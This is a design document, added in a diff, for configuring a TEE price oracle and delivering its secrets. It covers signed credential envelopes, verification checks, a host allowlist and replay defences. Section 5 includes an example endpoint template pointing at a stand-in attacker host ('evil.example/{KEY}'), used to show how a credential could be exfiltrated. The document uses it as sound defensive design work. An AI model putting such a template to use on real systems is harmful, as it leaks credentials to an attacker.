@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>USDX Oracle — Configuration &amp; Secrets</title>
+<style>
+  body { font-family: Arial, Helvetica, sans-serif; font-size: 10.5pt; line-height: 1.45;
+         color: #202124; max-width: 48em; margin: 2.5em auto; padding: 0 1.5em; }
+  h1 { font-size: 18pt; font-weight: 400; margin: 0 0 .1em; }
+  h2 { font-size: 13.5pt; font-weight: 400; margin: 1.7em 0 .3em;
+       border-bottom: 1px solid #dadce0; padding-bottom: .2em; }
+  h3 { font-size: 11pt; font-weight: 700; margin: 1.1em 0 .2em; }
+  p { margin: .45em 0; }
+  ul, ol { margin: .4em 0; padding-left: 1.4em; }
+  li { margin: .2em 0; }
+  code { font-family: "Courier New", monospace; font-size: 9.5pt; background: #f1f3f4; padding: 0 .2em; }
+  pre { font-family: "Courier New", monospace; font-size: 8.5pt; line-height: 1.32;
+        background: #f8f9fa; border: 1px solid #dadce0; padding: .7em; overflow-x: auto; margin: .5em 0; }
+  table { border-collapse: collapse; width: 100%; margin: .5em 0; font-size: 9.5pt; }
+  th, td { border: 1px solid #b0b3b8; padding: .3em .5em; text-align: left; vertical-align: top; }
+  th { background: #f1f3f4; font-weight: 700; }
+  .sub { color: #5f6368; font-style: italic; margin-bottom: 1.5em; font-size: 9.5pt; }
+  .r { color: #c5221f; font-weight: 700; }
+  .verdict { border-left: 3px solid #1a73e8; background: #f4f8fe; padding: .5em .9em; margin: .7em 0; }
+  .verdict.warn { border-left-color: #c5221f; background: #fdf3f2; }
+  .nav { background: #f8f9fa; border: 1px solid #dadce0; padding: .5em .9em; margin-bottom: 1.5em; font-size: 9.5pt; }
+  .t1 { background:#e8f0fe; } .t2 { background:#e6f4ea; } .t3 { background:#fce8e6; }
+</style>
+</head>
+<body>
+
+<h1>USDX Oracle — Configuration &amp; Secrets</h1>
+<p class="sub">Endpoints on-chain, credentials by direct instruction, semantics in the image.</p>
+<div class="nav">📎 <a href="usdx-oracle-index.html">Index</a> ·
+<a href="usdx-oracle-plan.html">Plan</a> · <a href="usdx-oracle-reference.html">Findings</a> ·
+<a href="usdx-oracle-architecture.html">Architecture</a> · <a href="usdx-oracle-extension.html">Extension</a> ·
+<a href="usdx-oracle-contracts.html">Contracts</a> · <a href="usdx-oracle-operations.html">Operations</a></div>
+
+<div class="verdict">
+This resolves <b>finding 12</b> in <code>usdx-oracle-findings.md</code> — "there is no config loader",
+currently the top open work item. The observation path is built and tested but nothing constructs an
+<code>oracle.Runner</code> because the configuration it needs does not exist yet. This page specifies it.
+</div>
+
+<h2>1. Three tiers, two delivery channels</h2>
+
+<div class="verdict">
+<b>Deciding question: "if this value changed, would the published price change?"</b> If yes it is part of
+the oracle's semantics and belongs in the image, covered by the registered code hash. If no, it is
+plumbing and can arrive at runtime.
+</div>
+
+<table>
+  <thead><tr><th style="width:8em">Tier</th><th>Channel</th><th>Public?</th><th>Verifiable by</th></tr></thead>
+  <tbody>
+    <tr class="t1"><td><b>Baked</b></td><td>compiled into the container</td><td>yes</td><td>code hash + published source</td></tr>
+    <tr class="t2"><td><b>Endpoints</b></td><td><b>on-chain instruction</b>, plaintext</td><td>yes — deliberately</td><td>anyone reading the instruction event</td></tr>
+    <tr class="t3"><td><b>Credentials</b></td><td><b>direct instruction</b> via proxy <code>/direct-instruction</code></td><td>no</td><td>admin signer set, itself pinned by the code hash</td></tr>
+  </tbody>
+</table>
+
+<p><b>Nothing secret touches the chain.</b> Endpoints are published because publishing them is the point —
+anyone can verify which providers we read. Credentials travel off-chain entirely, authorised by signatures
+the extension checks itself.</p>
+
+<h2>2. Inventory</h2>
+
+<h3 class="t1" style="padding:.2em .4em">Baked into the image</h3>
+<table>
+  <thead><tr><th style="width:15em">Value</th><th>Why pinned</th></tr></thead>
+  <tbody>
+    <tr><td>USDX contract list, per chain</td><td>Per the implementation's recorded decision, <b>the contract list <i>is</i> the exclusion policy</b> — there is no separate exclusion list. It must match the basis on which Hex reports reserves.</td></tr>
+    <tr><td>Chain IDs, quorum, finality margins</td><td>The integrity rule itself. A configurable "quorum = 1" silently removes redundancy — note Songbird deliberately <i>is</i> 1.</td></tr>
+    <tr><td><b>Permitted RPC host allowlist</b></td><td>§5 — what stops runtime endpoint config becoming a substitution or exfiltration channel.</td></tr>
+    <tr><td><b>Admin signer set + threshold</b></td><td>§4 — who may set credentials. Baking it means the answer is publicly verifiable without an on-chain contract.</td></tr>
+    <tr><td>Hex API base URLs and paths</td><td>Where reserves come from is part of what the oracle is.</td></tr>
+    <tr><td>Haircut (0), output decimals, feed ID, store address, target chain ID</td><td>Bound into the signed report, or directly answer-determining.</td></tr>
+    <tr><td>Plausibility bounds, <code>MaxAge</code>, freshness windows</td><td>Belt-and-braces beside the store's own bounds.</td></tr>
+  </tbody>
+</table>
+
+<h3 class="t2" style="padding:.2em .4em">Endpoints — on-chain instruction, plaintext</h3>
+<table>
+  <tbody>
+    <tr><td style="width:15em">RPC endpoint descriptors, per chain</td><td>Endpoints churn — three we surveyed died within weeks. Constrained by the baked host allowlist.</td></tr>
+    <tr><td>Per-provider enable / disable</td><td>Operational response to a flaky provider without a rebuild.</td></tr>
+    <tr><td>Timeouts, consistency window</td><td>Tuning. Cannot change <i>what</i> is measured.</td></tr>
+  </tbody>
+</table>
+
+<h3 class="t3" style="padding:.2em .4em">Credentials — direct instruction</h3>
+<table>
+  <tbody>
+    <tr><td style="width:15em"><code>HEX_API</code></td><td>Gates the private cash-reserves endpoint. The one true secret.</td></tr>
+    <tr><td><code>RPC_&lt;provider&gt;_&lt;chain&gt;</code></td><td>One per keyed provider. Usually embedded <i>in the URL</i> — see §5.</td></tr>
+  </tbody>
+</table>
+
+<h2>3. Why direct instructions are the right channel for credentials</h2>
+
+<p>The FCC spec describes direct instructions as messages "signed by one or a group of signers… which
+already has attached all required signatures and can be sent by anyone to a TEE proxy", used "for specific
+configurations or setups". That is precisely this case. Compared with routing credentials through the
+on-chain sender:</p>
+
+<table>
+  <thead><tr><th style="width:11em"></th><th>Direct instruction <i>(chosen)</i></th><th>On-chain instruction</th></tr></thead>
+  <tbody>
+    <tr><td>Credential on-chain</td><td><b>Never</b></td><td>As ciphertext, permanently</td></tr>
+    <tr><td>Cost</td><td>None</td><td>Registry fee + gas per rotation</td></tr>
+    <tr><td>Authorisation</td><td>Admin signer threshold, checked by the extension</td><td>Contract access control</td></tr>
+    <tr><td>Rotation latency</td><td>Immediate — one HTTP POST</td><td>A transaction, per machine</td></tr>
+    <tr><td>Contract surface</td><td>None — the sender stays minimal</td><td>Another owner-only setter to get wrong</td></tr>
+  </tbody>
+</table>
+
+<p>It also keeps <code>UsdxInstructionSender</code> smaller: it needs
+<code>requestPriceUpdate()</code> and <code>setEndpoints()</code>, and no secret-handling path at all.</p>
+
+<h2>4. The SET_SECRET envelope</h2>
+
+<div class="verdict warn">
+<b>"The submission can be done by anyone."</b> That is the spec's wording for
+<code>/direct-instruction</code>. Authorisation comes entirely from the signatures attached, so the message
+must be self-authenticating and the extension must verify it. The FCC guarantee that a data-provider
+threshold signed the message applies to <b>instructions only</b> — a direct action carries no such
+guarantee, and the spec puts the enforcement burden on the extension explicitly.
+</div>
+
+<pre>struct SecretEnvelope {
+    bytes32 domain;     // keccak256("USDX_ORACLE_SET_SECRET_V1")
+    uint256 chainId;    // environment binding — Coston2 envelope invalid on mainnet
+    address teeId;      // this machine only
+    bytes32 keyId;      // "HEX_API", "RPC_QUICKNODE_FLARE", ...
+    uint64  version;    // monotonic per (teeId, keyId)
+    uint64  issuedAt;   // freshness bound — see §7
+    bytes   secret;     // ECIES ciphertext to teeId's public key
+}
+
+digest  = keccak256(abi.encode(envelope))
+message = abi.encode(envelope, signatures[])     // M-of-N over digest</pre>
+
+<h3>Verification order — all of it, before touching the secret</h3>
+<table>
+  <thead><tr><th style="width:2em">#</th><th>Check</th><th>Rejects</th></tr></thead>
+  <tbody>
+    <tr><td>1</td><td><code>action.data.type == "direct"</code></td><td><b>A credential routed on-chain.</b> Enforces the design in code — if someone later wires <code>SET_SECRET</code> into the sender, it fails closed instead of publishing a credential to the chain.</td></tr>
+    <tr><td>2</td><td><code>domain</code> matches</td><td>Reuse of a signature produced for another message type</td></tr>
+    <tr><td>3</td><td><code>chainId</code> matches configured</td><td>Coston2 → mainnet replay (same admin keys, same machines)</td></tr>
+    <tr><td>4</td><td><code>teeId</code> == own TEE id</td><td>An envelope aimed at a different machine</td></tr>
+    <tr><td>5</td><td><code>issuedAt</code> within freshness window</td><td>Replay of a superseded envelope after a restart — §7</td></tr>
+    <tr><td>6</td><td><code>version &gt; last[keyId]</code></td><td>Out-of-order rotation reinstating an older credential</td></tr>
+    <tr><td>7</td><td>≥ threshold <b>distinct</b> recovered signers ∈ baked admin set</td><td>Unauthorised submission. Distinctness matters — one signer replaying their signature must not count twice.</td></tr>
+    <tr><td>8</td><td>decrypt via <code>POST /decrypt</code>, then install</td><td>—</td></tr>
+  </tbody>
+</table>
+
+<div class="verdict warn">
+<b>The result must disclose nothing.</b> <code>ActionResult.Data</code> nil, and the log a fixed string.
+Finding 1 established that <code>ActionResult.Log</code> is a <b>public surface</b> that has already leaked a
+query-string credential once. A <code>SET_SECRET</code> failure must not echo the keyId's value, the
+ciphertext, its length, or a decrypt error containing either.
+</div>
+
+<h3>The admin signer set</h3>
+<p>Baked into the image, so the code hash answers "who may set credentials" without an on-chain lookup —
+a nice property: the authorisation policy is as publicly verifiable as the price rule. Changing the admin
+set requires a new code version, which is correct for something this privileged.</p>
+<p><b>Open:</b> M-of-N values. Suggest 2-of-3 to start — one signer being unavailable must not block an
+emergency rotation, and one signer being compromised must not permit one.</p>
+
+<h2>5. Endpoints on-chain, and why the host allowlist is load-bearing</h2>
+
+<p>Many RPC providers embed the credential <i>in the URL</i> —
+<code>https://&lt;sub&gt;.quiknode.pro/&lt;key&gt;/</code>, <code>rpc.ankr.com/flare/&lt;key&gt;</code>,
+<code>?dkey=</code>. Since endpoints are published on-chain, the URL and the credential must be separated:</p>
+
+<pre>on-chain:   { "id": "quicknode-flare", "chain": 14,
+              "template": "https://example.quiknode.pro/{KEY}/" }
+credential: keyId "RPC_QUICKNODE_FLARE"  → delivered by direct instruction
+
+in enclave: url = template.replace("{KEY}", credentials[id])</pre>
+
+<p>The public record then says <i>"we query QuickNode's Flare endpoint"</i> — the fact worth verifying —
+while the credential never appears anywhere public. Unkeyed endpoints carry no placeholder and need no
+credential.</p>
+
+<div class="verdict warn">
+<b>A template with a placeholder can exfiltrate.</b> <code>"https://evil.example/{KEY}"</code> mails the
+credential out on the next update; <code>"https://evil.example/rpc"</code> substitutes the data itself, and
+quorum does not help if one attacker supplies every provider. The <b>baked host allowlist</b> is what makes
+on-chain endpoint config safe: reject any template whose host is not compiled in. Pair it with a
+<b>diversity rule</b> — a chain's providers must span <i>k</i> distinct operators — so a "redundant" set
+cannot be three URLs at one provider.
+</div>
+<p>This is also finding 2's territory: a redirect can hand the credential to a third party. <b>Disable
+redirect following</b> on any request carrying a credential, or re-validate the destination host against the
+same allowlist before following.</p>
+
+<h2>6. Should the credential still be encrypted?</h2>
+
+<div class="verdict">
+<b>Recommendation: yes — keep ECIES, on the direct-instruction channel.</b> Direct instructions remove
+the on-chain exposure, the gas and the latency, which is the substantive win. Dropping the encryption on
+top of that is a separate trade with a poor ratio.
+</div>
+
+<p>Three concrete reasons, beyond principle:</p>
+<ol>
+  <li><b>The proxy persists the queue.</b> The FCC spec: "The queue data is persistently stored in the
+      database (REDIS)." A plaintext credential therefore sits at rest on an ordinary VM — reachable through
+      a Redis compromise, a snapshot, or a backup, none of which are enclave-protected.</li>
+  <li><b>It forfeits an attestation claim.</b> "The operator could not have seen the API key" is one of the
+      three things the TEE buys us. The spec is explicit that <i>"the owner of the TEE machine also owns the
+      corresponding TEE proxy"</i> — so plaintext-through-proxy means plaintext-to-operator, by construction.</li>
+  <li><b>It is what makes automated re-provisioning safe</b> — see §7. An untrusted keeper can hold and
+      replay a ciphertext envelope without ever learning the credential. Holding a plaintext envelope would
+      make the keeper a credential store, which is exactly the authority we designed it not to have.</li>
+</ol>
+
+<p>The cost of keeping it is close to zero: the <code>teesecret</code> CLI in
+<code>extension-apikey</code> already does the ECIES encryption against the machine key published in the
+proxy's attested <code>/info</code>, and off-chain delivery means no gas either way.</p>
+
+<p><b>If you still want plaintext</b>, exactly one field changes — <code>secret</code> carries the raw bytes
+and step 8 skips <code>/decrypt</code>. Everything else in §4 stands, and the ordering, freshness and
+signer checks matter <i>more</i> in that case, not less. Note it also collapses §7's automation option.</p>
+
+<h2>7. Restart, replay and re-provisioning</h2>
+
+<div class="verdict warn">
+<b>Credentials live in memory and do not survive a restart.</b> The extension has no persistence. After
+any restart, redeploy or upgrade, every observation fails closed until credentials are re-injected.
+</div>
+
+<p>That interacts badly with the version counter, which also resets. An attacker who captured an old
+envelope could replay it into a freshly restarted machine and install a <i>superseded</i> credential — which,
+if that credential has been revoked at Hex, is a denial of service. Two defences:</p>
+<ul>
+  <li><b><code>issuedAt</code> freshness window</b> (§4 step 5) — bounds the replay window across restarts,
+      where the version counter cannot help. This is the load-bearing one.</li>
+  <li><b>Version monotonicity</b> — covers reordering within a machine's lifetime.</li>
+</ul>
+
+<h3>Automated recovery</h3>
+<p>Because envelopes are ciphertext, the keeper can hold a current set and re-submit them when it observes
+<code>not_configured</code>, without ever being able to read them. It is submitting to an endpoint the spec
+says anyone may submit to, with signatures it cannot forge — so this grants the keeper no authority it did
+not already have. <b>This resolves the open question from the previous design</b>, where holding plaintext
+envelopes would have made the keeper a credential store.</p>
+<p>The tension to settle: a short freshness window is safer but forces fresh admin signatures at every
+restart; a long one enables automation but widens replay. <b>Suggest ~24h with prompt revocation at Hex on
+rotation</b>, and re-signing as part of planned maintenance. Note replaying a <i>current</i> envelope is
+harmless — it installs what is already installed. Only superseded ones matter, so the window only needs to
+be shorter than the gap between rotation and revocation.</p>
+
+<h3>Readiness</h3>
+<ul>
+  <li>Track presence per <code>keyId</code>; start unconfigured.</li>
+  <li>Fail price actions with a distinct <code>not_configured</code> class — never a generic source error, or
+      the runbook sends someone to debug the wrong thing.</li>
+  <li>Expose booleans in <code>/state</code> ("hex key: present"), never values. <code>/state</code> is public.</li>
+  <li>Alert on it — the feed stales out shortly after.</li>
+</ul>
+<p><b>Related to finding 12:</b> the same readiness signal must distinguish stub mode. A hard-coded par
+price and a correctly-configured par price look identical from outside; the banner and
+<code>StubMode()</code> exist for exactly that reason, and <code>not_configured</code> must be equally loud.</p>
+
+<h2>8. Access control summary</h2>
+<table>
+  <thead><tr><th style="width:13em">Operation</th><th>Channel</th><th>Authorised by</th></tr></thead>
+  <tbody>
+    <tr><td><code>requestPriceUpdate()</code></td><td>on-chain</td><td>anyone, with a cooldown — liveness benefits from being permissionless</td></tr>
+    <tr><td><code>setEndpoints(teeId, cfg)</code></td><td>on-chain</td><td><b>owner only</b>, constrained by the baked host allowlist; consider a timelock so observers can react to a wrong-looking set</td></tr>
+    <tr><td><code>SET_SECRET</code></td><td><b>direct</b></td><td><b>M-of-N admin signatures</b>, verified by the extension; rejected outright if it arrives as an on-chain instruction</td></tr>
+  </tbody>
+</table>
+
+<h2>9. What a third party can verify</h2>
+<ul>
+  <li><b>Which token contracts, on which chains</b>, and the price rule, quorum policy and host allowlist — from the image.</li>
+  <li><b>Which RPC providers are in use</b>, and that they come from the pinned allowlist — from the instruction history plus the image.</li>
+  <li><b>Who is permitted to set credentials</b> — from the image, since the admin set is baked.</li>
+  <li><b>That the operator never saw the credentials</b> — from attestation plus ECIES, provided §6's recommendation stands.</li>
+</ul>
+<p>What they still cannot verify is whether Hex's API told the truth. No configuration design fixes that —
+see <a href="usdx-oracle-reference.html">Findings §1</a>.</p>
+
+<h2>10. Work items</h2>
+<ol>
+  <li>Config loader — the blocker in finding 12. Baked config struct, then endpoint and credential stores.</li>
+  <li><code>USDX_CONFIG</code> op type: <code>SET_ENDPOINTS</code> (instruction) and <code>SET_SECRET</code> (direct).</li>
+  <li>Envelope encode/decode, signature recovery, the eight checks, distinctness of signers.</li>
+  <li>Host allowlist + diversity validation; redirect handling per finding 2.</li>
+  <li>Readiness state, <code>not_configured</code> error class, <code>/state</code> booleans, alert.</li>
+  <li>Provisioning CLI — wrap <code>teesecret</code>, build and sign envelopes, submit to <code>/direct-instruction</code>.</li>
+  <li>Construct <code>oracle.Runner</code> in <code>cmd/docker</code>; regenerate conformance fixtures against the real payload.</li>
+</ol>
+
+<h3>Tests worth naming</h3>
+<ul>
+  <li><code>SET_SECRET</code> arriving as an on-chain instruction is <b>rejected</b>.</li>
+  <li>A Coston2-bound envelope is rejected on mainnet config.</li>
+  <li>An envelope for another <code>teeId</code> is rejected.</li>
+  <li>Threshold minus one signature is rejected; the same signature repeated to reach the threshold is rejected.</li>
+  <li>An expired <code>issuedAt</code> is rejected even at version 1 on a fresh process (the restart-replay case).</li>
+  <li>A failed <code>SET_SECRET</code> emits no value, length, or hostname in <code>Log</code> — same assertion style as finding 1's.</li>
+  <li>An endpoint template with an off-allowlist host is rejected.</li>
+</ul>
+
+<h2>11. Open questions</h2>
+<ol>
+  <li>Admin set membership and M-of-N. Suggest 2-of-3.</li>
+  <li>Freshness window length — trades restart automation against replay exposure (§7).</li>
+  <li>Timelock on <code>setEndpoints</code>? How long is useful without being obstructive?</li>
+  <li>Diversity rule <i>k</i>. Songbird has one working public endpoint, so any <i>k</i> &gt; 1 needs paid coverage there.</li>
+  <li>Does the proxy apply its own signature rules to unknown custom op types, or queue them unchecked? Our design does not depend on the answer — the extension verifies regardless — but it is worth knowing whether an unauthorised <code>SET_SECRET</code> is dropped at the proxy or reaches us and is rejected there.</li>
+</ol>
+
+</body>
+</html>
